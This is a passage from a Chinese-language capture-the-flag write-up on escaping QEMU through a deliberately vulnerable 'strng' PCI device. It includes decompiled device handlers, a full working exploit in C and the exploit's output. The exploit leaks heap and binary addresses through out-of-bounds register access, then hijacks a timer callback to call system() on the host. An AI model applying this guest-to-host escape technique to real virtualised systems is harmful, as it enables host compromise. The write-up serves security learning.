`pmio_read`和`pmio_write`也差不多，但是在`pmio_write`的`i!=0/1/3`的`else`分支调用了`timer_mod(&opaque->strng_timer, v4 + 100);`跟进去看发现最后有一个函数调用链。

```c
uint64_t __cdecl strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t val; // [rsp+14h] [rbp-10h]

  val = -1LL;
  if ( size != 4 )
    return -1LL;
  if ( !addr )
    return opaque->addr;
  if ( addr == 4 )
  {
    if ( opaque->addr & 3 )
      return -1LL;
    val = opaque->regs[opaque->addr >> 2];
  }
  return val;
}

void __cdecl strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  int64_t v4; // rax
  uint32_t saddr; // [rsp+24h] [rbp-Ch]

  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 && !(opaque->addr & 3) )
      {
        saddr = opaque->addr >> 2;
        if ( saddr == 1 )
        {
          opaque->regs[1] = rand();
        }
        else if ( saddr < 1 )
        {
          srand(val);
        }
        else if ( saddr == 3 )
        {
          opaque->regs[3] = rand_r(&opaque->regs[2]);
        }
        else
        {
          opaque->regs[saddr] = val;
          if ( opaque->flag )
          {
            v4 = qemu_clock_get_ms_4(QEMU_CLOCK_VIRTUAL_0);
            timer_mod(&opaque->strng_timer, v4 + 100);
          }
        }
      }
    }
    else
    {
      opaque->addr = val;
    }
  }
}
```

这个链是这样的：`timer_mod`->`timer_mod_ns`->`timerlist_rearm`->`timerlist_notify`->`(timer_list->notify_cb)(timer_list->notify_opaque);`，因为STRNGState后面跟了这个结构体，所以可以直接覆写其中的`cb`为`system@plt`，`opaque`为`cat /home/wz/flag`的地址，为了方便，我还是把它写到了`reg[2]`，然后泄露其地址。

```c
void __cdecl timer_mod(QEMUTimer_0 *ts, int64_t expire_time)
{
  timer_mod_ns(ts, expire_time * ts->scale);
}

void __cdecl timer_mod_ns(QEMUTimer_0 *ts, int64_t expire_time)
{
  _Bool rearm; // ST17_1
  QEMUTimerList_0 *timer_list; // [rsp+18h] [rbp-8h]

  timer_list = ts->timer_list;
  qemu_mutex_lock(&timer_list->active_timers_lock);
  timer_del_locked(timer_list, ts);
  rearm = timer_mod_ns_locked(timer_list, ts, expire_time);
  qemu_mutex_unlock(&timer_list->active_timers_lock);
  if ( rearm )
    timerlist_rearm(timer_list);
}

void __cdecl timerlist_rearm(QEMUTimerList_0 *timer_list)
{
  if ( timer_list->clock->type == 1 )
    qemu_start_warp_timer();
  timerlist_notify(timer_list);
}

void __cdecl timerlist_notify(QEMUTimerList_0 *timer_list)
{
  if ( timer_list->notify_cb )
    ((void (__fastcall *)(void *))timer_list->notify_cb)(timer_list->notify_opaque);
  else
    qemu_notify_event();
}

```

### exp.c

泄露地址拿gdb调下就好，这个里面没法ssh，所以exp需要打包到磁盘文件再从qemu启动本地读flag。打包命令为`find . | cpio -o --format=newc > rootfs.cpio`，其他跟第一道题没什么区别，调试一下看看偏移就好

```c
#include <sys/io.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/types.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc010;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr,uint32_t value)
{
    *((uint32_t *)(mmio_mem+addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem+addr));
}

void pmio_write(uint32_t addr,uint32_t value)
{
    outl(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)(inl(addr));
}

uint32_t pmio_abread(uint32_t offset)
{
    //return the value of (addr >> 2)
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint32_t offset,uint32_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main()
{
// Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
    //pmio_abwrite(0x100,0x12345678);
    //write args

    mmio_write(12,0x6d6f682f);
    mmio_write(16,0x7a772f65);
    mmio_write(20,0x616c662f);
    mmio_write(24,0x67);
    mmio_write(8,0x20746163);
    //set priviledge
    if(iopl(3) != 0){
        die("IO permission denied!\n");
    }
    //leak args/heap
	uint64_t heap_addr=pmio_abread((71 << 2));
    heap_addr=heap_addr<<32;
    heap_addr+=pmio_abread((70 << 2));
    uint64_t arg_addr = heap_addr + 0xb00;
    printf("[+]arg addr: 0x%llx\n",arg_addr);
    uint64_t proc_addr = pmio_abread(69 << 2);
    proc_addr = proc_addr << 32;
    proc_addr += pmio_abread(68 << 2);
    uint64_t proc_base = proc_addr - 2731150;
    printf("[+]proc addr: 0x%llx\n",proc_base);
    uint64_t system_plt = proc_base + 0x200d50;
    printf("[+]system addr: 0x%llx\n",system_plt);
    //get flag
    pmio_abwrite((70<<2),arg_addr & 0xffffffff);
    pmio_abwrite((68<<2),system_plt & 0xffffffff);
    return 0;
}

```
最终结果：

```sh
Welcome to QEMU-ESCAPE
qemu login: root
# cd /
# ./exp
mmio_mem @ 0xf7762000
[+]arg addr: 0x555558288570
[+]proc addr: 0x555555554000
[+]system addr: 0x555555754d50
# happy_new_year_2020!
```

## 小结

这两道题应该是逃逸类题目里最简单的类型，像是glibc pwn的数组越界，只要理解利用的原理就不难做，希望新的一年自己能学更多东西，努力追赶少年时的梦想。
